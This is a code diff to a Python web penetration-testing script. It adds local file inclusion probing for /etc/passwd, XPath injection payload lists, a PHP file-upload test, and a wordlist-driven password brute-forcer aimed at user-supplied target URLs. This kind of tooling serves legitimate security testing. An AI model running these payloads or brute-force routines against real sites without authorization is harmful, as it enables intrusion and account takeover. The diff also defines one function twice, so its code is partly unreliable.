@@ -124,6 +124,32 @@ def generate_traversal_payloads(base_payloads, max_levels):
             payloads.append(payload)
     return payloads
 
+# LFI Testing for Local File Inclusion
+def lfi_test(url, payloads):
+    def check_response(response):
+        if "root:x:0:0:" in response.text or "boot loader" in response.text or "error" in response.text.lower():
+            return True
+        return False
+
+    # Test URL parameters for LFI
+    parsed_url = urlparse(url)
+    query_params = parsed_url.query.split('&')
+    param_names = [param.split('=')[0] for param in query_params if '=' in param]
+
+    for param in param_names:
+        for payload in payloads:
+            obfuscated_payloads = [payload] + obfuscate_payload(payload)
+            for obfuscated_payload in obfuscated_payloads:
+                new_query_params = {param: obfuscated_payload for param in param_names}
+                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
+                response = requests.get(new_url)
+
+                if check_response(response):
+                    log_result("LFI Test", "Vulnerable", f"LFI vulnerability detected with payload {payload} in URL parameter {param}", url)
+                    return
+
+    log_result("LFI Test", "Not Vulnerable", "No LFI vulnerability detected", url)
+
 # XSS Testing for both stored and reflected XSS
 def xss_test(url, payloads):
     forms = crawl_for_forms(url)
@@ -272,11 +298,29 @@ def xpath_injection_test(url, payloads):
     forms = crawl_for_forms(url)
 
     def check_response(response):
-        if "XPathException" in response.text:
-            return True
+        # Check for common XPath errors and indicators of injection success
+        xpath_errors = [
+            "XPathException", "XPath Error", "invalid or unexpected token",
+            "unterminated string", "syntax error", "unclosed token",
+            "invalid predicate", "unexpected end of expression",
+            "1'='1", "XPath query", "node-set"
+        ]
+        for error in xpath_errors:
+            if error in response.text:
+                return True
         return False
 
-    # Test URL parameters for XPATH Injection
+    def log_detailed_response(test_type, payload, response, url, param=None, field=None):
+        # Log detailed response for further analysis
+        field_info = f" | Field: {field}" if field else ""
+        param_info = f" | Parameter: {param}" if param else ""
+        with open("detailed_xpath_injection_report.txt", "a") as log_file:
+            log_file.write(f"{test_type}: Testing payload {payload} {param_info} {field_info} | URL: {url}\n")
+            log_file.write(f"Response:\n{response.text}\n")
+        print(f"{test_type}: Testing payload {payload} {param_info} {field_info} | URL: {url}")
+        print(f"Response:\n{response.text}\n")
+
+    # Test URL parameters for XPath Injection
     parsed_url = urlparse(url)
     query_params = parsed_url.query.split('&')
     param_names = [param.split('=')[0] for param in query_params if '=' in param]
@@ -289,11 +333,12 @@ def xpath_injection_test(url, payloads):
                 new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
                 response = requests.get(new_url)
 
+                log_detailed_response("XPATH Injection Test", obfuscated_payload, response, url, param)
                 if check_response(response):
                     log_result("XPATH Injection Test", "Vulnerable", f"XPATH Injection vulnerability detected with payload {payload} in URL parameter {param}", url)
                     return
 
-    # Test form parameters for XPATH Injection
+    # Test form parameters for XPath Injection
     for form in forms:
         action = form['action']
         method = form['method']
@@ -308,6 +353,7 @@ def xpath_injection_test(url, payloads):
                 else:
                     response = requests.get(urljoin(url, action), params=data)
 
+                log_detailed_response("XPATH Injection Test", obfuscated_payload, response, url, field=list(inputs.keys()))
                 if check_response(response):
                     log_result("XPATH Injection Test", "Vulnerable", f"XPATH Injection vulnerability detected with payload {payload}", url, list(inputs.keys()))
                     return
@@ -417,13 +463,25 @@ def file_uploads_test(url):
             return True
         return False
 
+    # File Uploads Testing (continued)
+def file_uploads_test(url):
+    forms = crawl_for_forms(url)
+
+    # Example malicious file content
+    malicious_file_content = "<?php echo 'Vulnerable'; ?>"
+
+    def check_response(response):
+        if "Vulnerable" in response.text:
+            return True
+        return False
+
     # Test form parameters for File Uploads
     for form in forms:
         action = form['action']
         method = form['method']
         inputs = form['inputs']
 
-        files = {key: ('malicious.php', malicious_file_content) for key, value in inputs.items() if value == 'file'}
+        files = {key: ('malicious.php', malicious_file_content, 'application/php') for key, value in inputs.items() if value == 'file'}
         if method == 'post' and files:
             response = requests.post(urljoin(url, action), files=files)
             if check_response(response):
@@ -471,7 +529,7 @@ def session_issues_test(url):
     else:
         log_result("Session Issues Test", "Not Vulnerable", "No session fixation vulnerability detected", url)
 
-# Insecure Direct Object Reference Testing
+# Insecure Direct Object Reference (IDOR) Testing
 def idor_test(url, payloads):
     def check_response(response):
         if "Unauthorized" not in response.text:
@@ -653,6 +711,47 @@ def ssrf_test(url, payloads):
                 return
     log_result("SSRF Test", "Not Vulnerable", "No SSRF vulnerability detected", url)
 
+# Brute Force Testing
+def brute_force_test(url, username, wordlist_path):
+    with open(wordlist_path, 'r') as file:
+        passwords = [line.strip() for line in file.readlines()]
+
+    for password in passwords:
+        response = requests.post(url, data={'username': username, 'password': password})
+        if "Login successful" in response.text:
+            log_result("Brute Force Test", "Vulnerable", f"Successful login with password: {password}", url)
+            return
+    log_result("Brute Force Test", "Not Vulnerable", "No valid password found", url)
+
+# Login Function
+def login(url, username, password):
+    session = requests.Session()
+    response = session.post(url, data={'username': username, 'password': password})
+    if "Login successful" in response.text:
+        return session
+    else:
+        print("Login failed")
+        return None
+
+# API Testing
+def api_test(url, method, data):
+    if method == 'GET':
+        response = requests.get(url, params=data)
+    elif method == 'POST':
+        response = requests.post(url, data=data)
+    else:
+        print("Invalid HTTP method")
+        return
+    
+    print(f"Response Code: {response.status_code}")
+    print(f"Response Body: {response.text}")
+
+# Generate Report Chart
+def generate_report_chart():
+    print("Generating report chart...")
+    # Implementation for generating a report chart
+    # This could involve reading the log file and visualizing the results
+
 # Menu and Submenu system
 def display_menu():
     print("\nPenetration Testing Menu:")
@@ -671,6 +770,37 @@ def display_payload_menu():
     print("1. Load payloads from file")
     print("2. Use default payloads")
 
+# Example payloads for XPath Injection
+xpath_payloads = [
+    "' or '1'='1",
+    "\" or \"1\"=\"1",
+    "' or '1'='1' or '1'='1",
+    "\" or \"1\"=\"1\" or \"1\"=\"1",
+    "' or name()='username' or '1'='1",
+    "\" or name()='password' or \"1\"=\"1",
+    "' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1'",
+    "\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\"",
+    "' or count(/*)=1 or '1'='1",
+    "\" or count(/*)=1 or \"1\"=\"1",
+    "' or //user/*[1]='",
+    "\" or //user/*[1]=\"",
+    "' or 1=1 or '1'='",
+    "\" or 1=1 or \"1\"=\"",
+    "admin' and '1'='1",
+    "admin' or '1'='1",
+    "admin' and count(//user) > 0 and '1'='1",
+    "admin' or count(//user) > 0 or '1'='1",
+    "' and substring(name(/*),1,1)='a",
+    "' or substring(name(/*),1,1)='a",
+    "' and count(//*[text()='username']) > 0 and '1'='1",
+    "\" and count(//*[text()='username']) > 0 and \"1\"=\"1",
+    "%27%20or%20%271%27=%271",  # URL-encoded single quote injection
+    "%22%20or%20%221%22=%221",  # URL-encoded double quote injection
+    "'%20or%20'1'%3D'1",        # Partially encoded single quote injection
+    "\"%20or%20\"1\"%3D\"1"     # Partially encoded double quote injection
+]
+
+# Update the handle_menu_choice function to use these payloads for XPath Injection
 def handle_menu_choice(choice):
     target_url = input("Enter target URL: ")
     payloads = []
@@ -731,6 +861,8 @@ def handle_menu_choice(choice):
                     "%0d%0aX-Test: injected-header",
                     "%0aX-Test: injected-header"
                 ]
+            elif choice == 14:
+                payloads = xpath_payloads  # Use the expanded payload list for XPath Injection
 
     if choice == 1:
         crawl_for_forms(target_url)
